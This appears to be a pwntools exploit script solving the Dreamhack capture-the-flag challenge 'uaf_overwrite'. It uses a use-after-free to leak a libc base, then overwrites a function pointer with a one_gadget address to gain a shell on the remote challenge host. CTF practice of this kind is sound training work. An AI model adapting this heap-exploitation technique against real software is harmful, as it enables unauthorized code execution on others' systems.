from pwn import *

#p = process("./uaf_overwrite")
p = remote("host3.dreamhack.games", 20617)
e = ELF("./uaf_overwrite")

libc = ELF("./libc-2.27.so")

def human(weight: int, age: int):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"Human Weight: ", str(weight).encode())
	p.sendlineafter(b"Human Age: ", str(age).encode())

def robot(weight: int):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"Robot Weight: ", str(weight).encode())

def custom(size: int, data: str, free_idx:int):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b": ", str(size).encode())
	p.sendafter(b": ", data.encode())
	p.sendlineafter(b": ", str(free_idx).encode())

custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)

lb = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42
og = lb + 0x10a41c
print(hex(lb))
human(1, og)
robot(1)

p.interactive()
